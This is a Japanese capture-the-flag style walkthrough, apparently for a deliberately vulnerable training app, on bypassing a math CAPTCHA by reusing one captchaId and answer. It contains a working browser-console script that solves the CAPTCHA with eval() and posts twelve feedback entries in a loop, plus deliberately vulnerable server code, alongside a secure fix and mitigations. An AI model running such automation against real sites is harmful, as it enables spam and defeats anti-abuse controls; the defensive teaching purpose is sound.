# CAPTCHA Bypass ✅

**難易度:** ⭐⭐⭐
**カテゴリ:** 自動化 / Anti-Automation Bypass
**目標:** 10秒以内に10件以上のフィードバックを送信

---

## 背景知識

### CAPTCHA とは

CAPTCHA（Completely Automated Public Turing test to tell Computers and Humans Apart）は、**人間と自動プログラム（ボット）を区別するための仕組み**。

```
┌─────────────────────────────────────────────────────────────────┐
│                     CAPTCHAの役割                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  【CAPTCHAなし】                                                 │
│                                                                 │
│  ボット ─────────────────▶ サーバー                             │
│    │                          │                                │
│    │  POST x 10000回/秒       │                                │
│    │ ─────────────────────▶   │                                │
│    │                          │ ← スパムで埋め尽くされる        │
│                                                                 │
│  【CAPTCHAあり（正常動作）】                                      │
│                                                                 │
│  ボット ─────────────────▶ サーバー                             │
│    │                          │                                │
│    │  「7 + 3 = ?」           │                                │
│    │ ◀─────────────────────   │                                │
│    │                          │                                │
│    │  ボット「えーと...?」    │ ← 自動解答が困難               │
│    │  (画像認識/計算が必要)   │                                │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### CAPTCHAの種類

| 種類 | 例 | 強度 |
|------|-----|------|
| 計算問題 | 「7 + 3 = ?」 | 低（プログラムで解ける） |
| 画像認識 | 「信号機を選べ」 | 中 |
| reCAPTCHA | Google の行動分析 | 高 |
| hCaptcha | プライバシー重視型 | 高 |

### 日常的な例え

入場券のシステムを想像してください:

- **正しい仕組み**: チケット1枚で1回だけ入場可能。入場後はチケットに穴を開けて無効化
- **脆弱な仕組み**: チケットを見せるだけで入場可能。同じチケットを何度も使える

CAPTCHAも同様で、**一度使った回答は無効にすべき**。

---

## 思考プロセス

### ステップ1: CAPTCHAの仕組みを理解

```
「フィードバック送信フォームを観察」
    ↓
「計算問題（例: 7 + 3）が表示されている」
    ↓
「毎回異なる問題が出る → 自動化を防ぐ目的」
    ↓
「でも、サーバー側でどう検証しているか？」
```

### ステップ2: APIリクエストを分析

```
「DevTools → Network タブで観察」
    ↓
「GET /rest/captcha → 計算問題を取得」
「レスポンス: { captchaId: 1, captcha: "7+3" }」
    ↓
「POST /api/Feedbacks → フィードバック送信」
「ボディ: { captchaId: 1, captcha: "10", ... }」
    ↓
「captchaId と答えをペアで送信している」
```

### ステップ3: 再利用の可能性を検証

```
「普通なら、1回使ったら無効になるはず」
    ↓
「同じ captchaId と答えで2回目を試す」
    ↓
「成功した！無効化されていない」
    ↓
「CAPTCHAの再利用が可能 = 脆弱性」
```

### ステップ4: 自動化スクリプトを作成

```
「1回CAPTCHAを取得」
    ↓
「計算問題を eval() で解く」
    ↓
「同じ答えで12回ループ送信」
    ↓
「10秒以内に10件送信 → チャレンジクリア」
```

---

## 実行手順

### Step 1: ログインする

任意のユーザーでログイン

### Step 2: CAPTCHAの動作を確認

DevTools で `/rest/captcha` のレスポンスを確認:

```json
{
  "captchaId": 5,
  "captcha": "7+3",
  "answer": "10"  // 本番では返されない
}
```

### Step 3: 攻撃スクリプトを実行

Console で以下を実行:

```javascript
// CAPTCHA Bypass - 自動フィードバック送信
(async () => {
  // 1. CAPTCHAを1回だけ取得
  const captchaRes = await fetch('/rest/captcha').then(r => r.json());
  console.log('CAPTCHA問題:', captchaRes.captcha);

  // 2. 計算問題を解く（例: "7+3" → 10）
  const answer = eval(captchaRes.captcha).toString();
  console.log('答え:', answer);

  // 3. 同じCAPTCHAで12回送信
  const token = localStorage.getItem('token');
  const startTime = Date.now();

  for (let i = 0; i < 12; i++) {
    const response = await fetch('/api/Feedbacks/', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + token
      },
      body: JSON.stringify({
        captchaId: captchaRes.captchaId,  // 同じID
        captcha: answer,                   // 同じ答え
        comment: `Automated feedback #${i + 1}`,
        rating: 1
      })
    });

    if (response.ok) {
      console.log(`✓ Feedback ${i + 1} sent`);
    } else {
      console.log(`✗ Feedback ${i + 1} failed`);
    }
  }

  const elapsed = (Date.now() - startTime) / 1000;
  console.log(`\n完了！ ${elapsed.toFixed(2)}秒で12件送信`);
})();
```

### Step 4: 結果を確認

```
CAPTCHA問題: 7+3
答え: 10
✓ Feedback 1 sent
✓ Feedback 2 sent
...
✓ Feedback 12 sent

完了！ 1.23秒で12件送信
```

10秒以内に10件以上送信できれば、チャレンジクリア。

---

## 攻撃フローの図解

```
┌─────────────────────────────────────────────────────────────────┐
│                     CAPTCHA Bypass 攻撃                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  攻撃者                                サーバー                 │
│      │                                    │                    │
│      │  GET /rest/captcha                 │                    │
│      │ ─────────────────────────────────▶ │                    │
│      │                                    │                    │
│      │  { captchaId: 5, captcha: "7+3" } │                    │
│      │ ◀───────────────────────────────── │                    │
│      │                                    │                    │
│      │  eval("7+3") = 10                  │                    │
│      │                                    │                    │
│      │  POST (captchaId:5, captcha:"10") │                    │
│      │ ─────────────────────────────────▶ │ ← 1回目OK         │
│      │                                    │                    │
│      │  POST (captchaId:5, captcha:"10") │                    │
│      │ ─────────────────────────────────▶ │ ← 2回目もOK！      │
│      │                                    │   (無効化されない)  │
│      │  ...                               │                    │
│      │                                    │                    │
│      │  POST (captchaId:5, captcha:"10") │                    │
│      │ ─────────────────────────────────▶ │ ← 12回目もOK！     │
│      │                                    │                    │
│      │  😱 同じCAPTCHAで12回送信成功       │                    │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 脆弱なコードパターン

```javascript
// ❌ 脆弱なコード
const captchas = {};  // CAPTCHAを保存

// CAPTCHA生成
app.get('/rest/captcha', (req, res) => {
  const id = Date.now();
  const num1 = Math.floor(Math.random() * 10);
  const num2 = Math.floor(Math.random() * 10);
  const answer = (num1 + num2).toString();

  captchas[id] = answer;  // 保存（無効化の仕組みがない）

  res.json({ captchaId: id, captcha: `${num1}+${num2}` });
});

// フィードバック送信
app.post('/api/Feedbacks', (req, res) => {
  const { captchaId, captcha } = req.body;

  // CAPTCHAを検証
  if (captchas[captchaId] !== captcha) {
    return res.status(401).send('Wrong CAPTCHA');
  }

  // ❌ 使用後もCAPTCHAが残っている → 再利用可能
  // delete captchas[captchaId];  ← これがない！

  // フィードバック保存
  Feedback.create(req.body);
  res.json({ success: true });
});
```

### 問題点

1. **再利用可能**: 使用後にCAPTCHAを削除していない
2. **有効期限なし**: 古いCAPTCHAが永久に有効
3. **レート制限なし**: 連続送信を制限していない

---

## 安全な実装

```javascript
// ✅ 安全なコード
const captchas = new Map();

// CAPTCHA生成
app.get('/rest/captcha', (req, res) => {
  const id = crypto.randomUUID();  // 予測困難なID
  const num1 = Math.floor(Math.random() * 10);
  const num2 = Math.floor(Math.random() * 10);
  const answer = (num1 + num2).toString();

  // 有効期限付きで保存（5分）
  captchas.set(id, {
    answer,
    expiresAt: Date.now() + 5 * 60 * 1000,
    used: false
  });

  res.json({ captchaId: id, captcha: `${num1}+${num2}` });
});

// フィードバック送信
app.post('/api/Feedbacks', (req, res) => {
  const { captchaId, captcha } = req.body;
  const stored = captchas.get(captchaId);

  // 1. 存在チェック
  if (!stored) {
    return res.status(401).send('Invalid CAPTCHA');
  }

  // 2. 有効期限チェック
  if (Date.now() > stored.expiresAt) {
    captchas.delete(captchaId);
    return res.status(401).send('CAPTCHA expired');
  }

  // 3. 使用済みチェック
  if (stored.used) {
    return res.status(401).send('CAPTCHA already used');
  }

  // 4. 答え合わせ
  if (stored.answer !== captcha) {
    return res.status(401).send('Wrong CAPTCHA');
  }

  // 5. 使用済みにマーク（または削除）
  captchas.delete(captchaId);  // ✅ 1回使ったら削除

  // フィードバック保存
  Feedback.create(req.body);
  res.json({ success: true });
});
```

### 対策のポイント

| 対策 | 説明 |
|------|------|
| **1回限り** | 使用後は即座に無効化 |
| **有効期限** | 5分程度で自動失効 |
| **予測困難なID** | 連番ではなくUUID |
| **レート制限** | IP/ユーザーごとに送信回数制限 |
| **サーバーサイド検証** | 答えはサーバーでのみ計算 |

---

## なぜ計算問題CAPTCHAは弱いのか

```javascript
// 攻撃者の視点
const captchaText = "7+3";  // サーバーから取得

// 方法1: eval() で直接計算
const answer = eval(captchaText);  // 10

// 方法2: 正規表現でパース
const [, num1, op, num2] = captchaText.match(/(\d+)([+\-*/])(\d+)/);
const answer = op === '+' ? parseInt(num1) + parseInt(num2) : ...;
```

計算問題は**プログラムで簡単に解ける**ため、CAPTCHAとしての強度は低い。本番環境では reCAPTCHA や hCaptcha の使用が推奨される。

---

## 関連チャレンジ

- [Zero Stars](../difficulty-1/zero-stars.md) - 入力検証バイパス
- [Forged Feedback](forged-feedback.md) - 他人としてフィードバック送信
- [Bully Chatbot](../difficulty-1/bully-chatbot.md) - 自動化の別パターン

## 参考リンク

- [OWASP - Blocking Brute Force Attacks](https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks)
- [Google reCAPTCHA](https://www.google.com/recaptcha/about/)
- [CWE-307: Improper Restriction of Excessive Authentication Attempts](https://cwe.mitre.org/data/definitions/307.html)
